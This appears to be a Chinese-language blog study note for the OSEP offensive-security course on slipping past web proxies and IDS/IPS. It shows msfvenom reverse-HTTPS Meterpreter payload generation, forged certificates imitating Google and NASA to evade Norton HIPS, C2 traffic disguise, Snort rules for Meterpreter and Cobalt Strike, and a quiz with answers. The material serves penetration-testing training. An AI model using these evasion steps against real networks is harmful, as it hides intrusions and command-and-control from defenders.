---
title: OSEP-10-Web代理与IDS绕过
description: '10-网络过滤绕过 | 04-Web代理与IDS绕过'
pubDate: 2026-01-30T00:01:41+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
---

# Module 10: 网络过滤绕过

## 第三节：Web 代理与 IDS/IPS 绕过

### Web 代理是最常见的出站过滤设备

Web 代理可以检查和操纵 HTTP/HTTPS 连接，是企业环境中最常见的过滤设备。

---

## 一、Web 代理工作原理

### 1.1 代理流程

```
┌──────────┐                    ┌──────────┐                    ┌──────────┐
│  客户端   │ ──HTTP请求──→     │ Web 代理  │ ──HTTP请求──→     │ 目标服务器│
│          │                    │          │                    │          │
│ 10.0.0.1 │                    │10.0.0.254│                    │ 外部 IP  │
│          │ ←──HTTP响应──     │          │ ←──HTTP响应──     │          │
└──────────┘                    └──────────┘                    └──────────┘
                                     │
                                     ▼
                              ┌──────────────┐
                              │ 代理功能:     │
                              │ - URL 过滤   │
                              │ - 内容检查   │
                              │ - 日志记录   │
                              │ - NAT 转换   │
                              └──────────────┘
```

### 1.2 代理检查内容

| 检查项 | 说明 | 示例 |
|--------|------|------|
| URL | 完整请求路径 | /malware/payload.exe |
| Host 头 | 目标域名 | evil.com |
| User-Agent | 浏览器标识 | Mozilla/5.0... |
| Referer | 来源页面 | 检测异常跳转 |
| Content-Type | 内容类型 | application/exe |
| 响应内容 | 实际数据 | 恶意代码特征 |

---

## 二、绕过 Web 代理

### 2.1 代理感知 Payload

Payload 必须能够检测并使用本地代理设置。

```
Meterpreter HTTP/S Payload:
├── 自动检测代理设置
├── 使用 InternetSetOptionA API
└── 支持代理认证
```

### 2.2 设置正确的 User-Agent

```powershell
# 获取目标环境使用的 User-Agent
# 方法 1: 社会工程
# 方法 2: 抓包分析
# 方法 3: 使用常见浏览器 UA

# Edge 浏览器 User-Agent 示例
$ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
```

### 2.3 Metasploit 配置 User-Agent

```bash
# 在 Metasploit 中设置 User-Agent
msf6> set HttpUserAgent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# 或在 payload 生成时指定
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=example.com \
    LPORT=443 \
    HttpUserAgent="Mozilla/5.0..." \
    -f exe -o payload.exe
```

### 2.4 域名分类绕过

```
策略: 使用被允许分类的域名

常见允许的分类:
├── 商业/经济
├── 计算机/技术
├── 教育
├── 政府
└── 新闻/媒体

常见阻止的分类:
├── 恶意软件
├── 钓鱼
├── 赌博
├── 成人内容
└── 代理/匿名
```

---

## 三、IDS/IPS 工作原理

### 3.1 检测流程

```
网络流量
    │
    ▼
┌─────────────────┐
│  流量捕获       │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  数据包重组     │ ← 处理分片
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  协议解析       │ ← 识别应用层协议
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│  签名匹配       │ ← 与规则库比对
└────────┬────────┘
         │
    ┌────┴────┐
    │         │
    ▼         ▼
  正常      匹配
    │         │
    ▼         ▼
  放行    告警/阻断
```

### 3.2 签名示例

```
Meterpreter HTTPS 签名特征:
├── 特定的 URI 模式
├── 特定的 HTTP 头
├── 特定的证书特征
└── 特定的数据包大小
```

### 3.3 Snort 规则示例

```
# 检测 Meterpreter 流量的 Snort 规则示例
alert tcp any any -> any 443 (
    msg:"Meterpreter HTTPS detected";
    content:"RECV";
    sid:1000001;
    rev:1;
)

# 检测 Cobalt Strike 的规则
alert http any any -> any any (
    msg:"Cobalt Strike Beacon";
    content:"HTTP/1.1 200 OK";
    content:" ";  # 额外空格
    sid:1000002;
    rev:1;
)
```

---

## 四、绕过 IDS/IPS

### 4.1 修改流量特征

由于 IDS/IPS 依赖签名匹配，修改流量特征可以绕过检测。

```
可修改的特征:
├── URI 路径
├── HTTP 头
├── SSL 证书
├── 数据包大小
└── 通信间隔
```

### 4.2 自定义 SSL 证书

Meterpreter 默认证书容易被检测，使用自定义证书可以绕过。

```bash
# 1. 生成自签名证书
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key

# 填写证书信息（伪装成合法网站）
Country Name: US
State: California
Locality: San Francisco
Organization: Google Inc
Common Name: www.google.com
Email: admin@google.com

# 2. 合并证书和私钥
cat priv.key cert.crt > google.pem

# 3. 修改 OpenSSL 配置（如果需要）
# 编辑 /etc/ssl/openssl.cnf
# 将 CipherString=DEFAULT@SECLEVEL=2 改为 CipherString=DEFAULT

# 4. 在 Metasploit 中使用
msf6> set HandlerSSLCert /path/to/google.pem
msf6> exploit
```

### 4.3 使用 impersonate_ssl 模块

```bash
# 使用 Metasploit 模块模拟真实网站证书
msf6> use auxiliary/gather/impersonate_ssl
msf6> set RHOST www.google.com
msf6> run

# 生成的证书会模拟目标网站的证书信息
```

### 4.4 证书固定 (Certificate Pinning)

防止 HTTPS 检查设备的中间人攻击。

```bash
# 在 Metasploit 中启用证书固定
msf6> set StagerVerifySSLCert true
msf6> set HandlerSSLCert /path/to/cert.pem

# 如果证书不匹配，Meterpreter 会终止连接
```

---

## 五、案例：绕过 Norton HIPS

### 5.1 问题

Norton 360 的 HIPS 可以检测标准 Meterpreter HTTPS 会话。

### 5.2 原因分析

```
Norton 检测的是 Meterpreter 的默认证书特征:
├── 随机生成的证书字段
├── 特定的证书结构
└── 自签名证书模式
```

### 5.3 解决方案

```bash
# 1. 生成自定义证书
openssl req -new -x509 -nodes -out cert.crt -keyout priv.key

# 使用看起来合法的信息
Country Name: US
State: TX
Locality: Houston
Organization: NASA
Common Name: nasa.gov
Email: info@nasa.gov

# 2. 合并证书
cat priv.key cert.crt > nasa.pem

# 3. 配置 Metasploit
msf6> set HandlerSSLCert /home/kali/nasa.pem
msf6> exploit

# 4. 测试连接
# Norton HIPS 不再检测到 Meterpreter
```

---

## 六、流量正常化

### 6.1 原则

让 C2 流量看起来像正常的 Web 流量。

```
正常化检查清单:
□ 使用标准 HTTP 方法 (GET/POST)
□ 正确的 Content-Type
□ 合理的 User-Agent
□ 正常的请求间隔
□ 合理的数据包大小
□ 使用常见端口 (80/443)
```

### 6.2 Metasploit 配置选项

```bash
# HTTP/HTTPS Payload 配置
set HttpUserAgent "Mozilla/5.0..."
set HttpServerName "Apache"
set HttpUnknownRequestResponse "<html>404 Not Found</html>"
set SessionCommunicationTimeout 300
set SessionExpirationTimeout 604800
```

### 6.3 使用 Wireshark 验证

```
在测试环境中:
1. 启动 Wireshark 捕获流量
2. 执行 Payload
3. 分析流量特征
4. 与正常浏览器流量对比
5. 调整配置直到流量看起来正常
```

---

## 七、HTTPS 检查绕过

### 7.1 检测 HTTPS 检查

```powershell
# 检查证书颁发者
# 如果是企业 CA 而非网站原始 CA，说明存在 HTTPS 检查

# 在浏览器中查看证书
# 或使用 PowerShell
$url = "https://www.google.com"
$request = [System.Net.WebRequest]::Create($url)
$request.GetResponse() | Out-Null
$cert = $request.ServicePoint.Certificate
$cert.Issuer
```

### 7.2 绕过策略

| 策略 | 说明 |
|------|------|
| 使用不检查的分类 | 银行类网站通常不被检查 |
| 证书固定 | 检测到中间人时终止 |
| 非标准端口 | 某些端口可能不被检查 |
| DNS 隧道 | 完全绕过 HTTPS 检查 |

---

## 八、章节测试

### 选择题

1. Web 代理检查以下哪项？
   - A) 内存内容
   - B) User-Agent
   - C) CPU 使用率
   - D) 磁盘空间

2. IDS 和 IPS 的主要区别是？
   - A) 检测方式不同
   - B) IPS 可以阻断流量
   - C) IDS 更准确
   - D) IPS 更便宜

3. 绕过 IDS/IPS 签名检测的方法是？
   - A) 使用更快的网络
   - B) 修改流量特征
   - C) 使用更大的数据包
   - D) 使用 UDP 协议

4. 自定义 SSL 证书的目的是？
   - A) 加密流量
   - B) 绕过证书签名检测
   - C) 提高速度
   - D) 减少流量

5. 证书固定 (Certificate Pinning) 的作用是？
   - A) 加速连接
   - B) 检测 HTTPS 检查设备
   - C) 压缩数据
   - D) 缓存证书

### 实践题

1. 使用 OpenSSL 生成自签名证书。

2. 在 Metasploit 中配置自定义 SSL 证书。

### 答案

**选择题**：1-B, 2-B, 3-B, 4-B, 5-B

---

**下一节**：[05-域前置技术.md](/blog/osep/10-网络过滤绕过/05-域前置技术/) - 域前置 (Domain Fronting) 技术
